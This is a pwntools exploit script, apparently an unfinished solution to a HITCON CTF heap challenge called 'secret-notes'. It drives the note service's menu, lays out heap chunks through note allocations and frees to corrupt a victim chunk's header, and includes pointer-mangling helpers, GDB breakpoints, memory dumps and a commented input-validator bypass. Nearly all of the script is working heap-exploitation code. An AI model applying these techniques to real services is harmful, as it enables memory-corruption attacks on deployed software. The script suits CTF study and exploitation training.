#!/usr/bin/env python3

from pwn import *

exe = context.binary = ELF(args.EXE or '', checksec=True)
# libc = exe.libc
context.terminal = ["tmux", "splitw", "-h"]
# context.encoding = 'utf-8'

gdbscript = '''
# is_note_format_correct
# brva 0x1B20

# read::get_note_idx
# brva 0x22A8

# strdup
# brva 0x1C48

define tok
	set $a = *(long*)($base("libc")+0x2102B8)
	db $a
end

continue
'''

pre_argv = []
post_argv = []

def get_conn(pre_argv=[], post_argv=[], gdbscript="", *a, **kw):
    host = args.HOST or 'secret-notes.chal.hitconctf.com'
    port = int(args.PORT or 12387)
    gdbscript = '\n'.join(line for line in gdbscript.splitlines() if line and not line.startswith('#'))
    exe_name = os.path.basename(exe.path)
    cmd = pre_argv + [exe.path] + post_argv

    if args.DOCKER:
        if args.REMOTE:
            p = remote(host, port, *a, **kw)
        else:
            p = process(f'docker run -i --rm {args.DOCKER}', shell=True)
        if args.GDB:
            sleep(1) # TODO: find better method
            gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return p
    if args.LOCAL:
        r = process(["./run.sh"], *a, **kw)
        gdb.attach(pidof(exe_name)[0], gdbscript=gdbscript, exe=exe.path, *a, **kw)
        return r
    if args.GDB:
        return gdb.debug(cmd, gdbscript=gdbscript, *a, **kw)
    if args.REMOTE:
        return remote(host, port, *a, **kw)

    return process(cmd, *a, **kw)

io = get_conn(pre_argv, post_argv, gdbscript)
r = lambda *a, **k: io.recv(*a, **k)
rl = lambda *a, **k: io.recvline(*a, **k)
ru = lambda *a, **k: io.recvuntil(*a, **k)
cl = lambda *a, **k: io.clean(*a, **k)
s = lambda *a, **k: io.send(*a, **k)
sa = lambda *a, **k: io.sendafter(*a, **k)
sl = lambda *a, **k: io.sendline(*a, **k)
sla = lambda *a, **k: io.sendlineafter(*a, **k)
ia = lambda *a, **k: io.interactive(*a, **k)
rotate_left = lambda x, a, s=64: (x << a) | (x >> (s-a))
rotate_right = lambda x, a, s=64: (x >> a) | (x << (s-a))
safe_link = lambda addr, ptr: (addr >> 12) ^ ptr
ptr_mangle = lambda addr, cookie=0: rotate_left(addr ^ cookie, 17)
ptr_demangle = lambda addr, cookie=0: rotate_right(addr, 17) ^ cookie
logleak = lambda **k: [success(f"{k}: {v:#x}") for k, v in k.items()]


def trace(func):
    def wrapper(*args, **kwargs):
        info(f"{func.__name__} {args} {kwargs}")
        return func(*args, **kwargs)
    return wrapper

r = io

@trace
def login(name, password):
    r.sendlineafter(b'Input your action:', b'1')
    r.sendlineafter(b'Input the username:', name)
    r.sendlineafter(b'Input the 8 bytes password:', password)

@trace
def logout():
    r.sendlineafter(b'Input your action:', b'4')

def _create_note(length, note):
    info(f"_create_note len: {length}")
    r.sendlineafter(b'Input your action:', b'1')
    r.sendlineafter(b'Input the length of the note, including headers:', str(length).encode())
    with context.local(log_level='CRITICAL'):
        r.sendafter(b'Input the note:', note)
    r.recvuntil(b'Successfully add the note as id ')
    note_id = int(r.recvuntil(b'.')[:-1])
    return note_id
    
def create_note(note):
    return _create_note(len(note), note)

def create_note_from_parts(name, pwd, content):
    note = name + b':' + pwd + b':' + content + b'\n'
    return create_note(note)

@trace
def read_note(idx):
    r.sendlineafter(b'Input your action:', b'2')
    r.sendlineafter(b'Input the note id:', str(idx).encode())
    r.recvuntil(b'Here is your note "')
    note_header = r.recvuntil(b'": ')[:-3]
    note_value = r.recvline().strip()
    return note_header, note_value

@trace
def delete_note(idx):
    r.sendlineafter(b'Input your action:', b'3')
    r.sendlineafter(b'Input the note id:', str(idx).encode())

free = delete_note


login(b'asdf', b'\x00'*8)

info("huge chunk 1, use some memory (mmaped)")
payload = b'ASDF:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += b'D' * (0x1FFFFF2-0x20)
payload += b'\n'
big1 = create_note(payload)


payload = b'A:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += (0x28-1-1 - len(payload)) * b'A' + b'\n'
note1 = create_note(payload)


payload = b'A:\x01\x01\x01\x01\x01\x01\x01\x01\n'
# body will be xored with \x01
# payload += (0x800-1-1 - len(payload)) * b'A' + b'\n'
payload += b'XXXX' + p64(u64(b':X:XX:XX') ^ 0x0101010101010101)
payload += (0x800-1-1 - len(payload)) * b'A' + b'\n'
filler1 = create_note(payload)

free(filler1)

payload = b'R:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += b'aaa\n'
strtoker = create_note(payload)

free(strtoker)
free(note1)


payload = b'A:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += (0xa20-1-1 - len(payload)) * b'V' + b'\n'
victim = create_note(payload)

payload = b'R:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += b'aaa\n'
strtoker = create_note(payload)
free(strtoker)


# huge chunk 2, malloc will return null
payload = b'ASDF:\x01\x01\x01\x01\x01\x01\x01\x01\n'
payload += b'D' * (0x1FFFFF2-0x20)
payload += b'\n'
big2 = create_note(payload)

info("Chunk victim header changed")

ia()



"""
note format:
<string{1,32}>[: \t]<string{8}>[:\n]<string+>\n


0x55555956c4b0  0x000055555956c4cb      0x0000000000000811      ..VYUU..........
0x55555956c4c0  0x0101010101010041      0x4040404040000101      A..........@@@@@
0x55555956c4d0  0x4040404040404040      0x4040404040404040      @@@@@@@@@@@@@@@@
0x55555956c4e0  0x4040404040404040      0x4040404040404040      @@@@@@@@@@@@@@@@




p/x *(long*)($base("libc")+0x2102B8)


note content & pwd have to be non-NULL

"""


# bypass note validator, but crashes in parse_note
# payload = b':\x01\x01\x01\x01\x01\x01\x01\x01\n\n'
# payload = (0x28-1 - len(payload)) * b'A' + payload
# note1 = create_note(payload)
# note1 = create_note(b'AAAAAAAAAA:\x01\x01\x01\x01\x01\x01\x01\x01\nDUPADUPADUPADUPA')
